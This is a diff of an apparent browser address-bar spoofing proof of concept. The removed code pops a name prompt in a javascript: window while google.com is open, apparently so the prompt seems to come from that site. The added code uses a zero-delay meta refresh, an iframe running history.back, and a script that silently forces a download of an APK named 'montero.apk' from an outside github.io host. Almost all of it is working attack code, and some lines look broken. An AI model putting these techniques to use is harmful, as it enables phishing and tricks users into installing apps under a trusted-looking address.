@@ -1,41 +1,31 @@
-<a href="javascript:run();" style="font-size:100px;">google.co.il</a>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm">  <!-- if CONTENT >1 address bar will not dispaly chrome://newtab/ -->
+<iframe src="spoof.htm"></iframe>
+index.htm
+====================
+<script>
+setTimeout('sleep()',500);
+alert(1); //alert twice
+</script>
 
 <script>
-var myWindow;
+function sleep()
+{
+    document.write("123<br>");
 
-function run(){
-
-    var script = `
-        setTimeout(function(){
-            var t = window.open('https://google.com');
-        },250);
-
-        setTimeout(function(){
-
-            var name = '';
-            while(name == ''){
-                name = prompt('Give me your name please','');
-            }
-
-            window.opener.save(name);
-            window.close();
-
-        },5000);
-
-        setTimeout(function(){
-            var meta = document.createElement('meta');
-            meta.httpEquiv = 'refresh';
-            meta.content = '0; url=https://example.com';
-            document.head.appendChild(meta);
-        },5500);
-    `;
-
-    myWindow = window.open("javascript:" + script);
+    var link = document.createElement("a");
+    link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
+    link.download = "montero.apk";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 }
 
-function save(name){
-    alert("Name is " + name);
-    myWindow.close();
-    window.close();
-}
+</script>
+
+spoof.htm
+===========
+<script>
+document.documentURI=eval();
+history.back(null)
+//debug alert(1)
 </script>
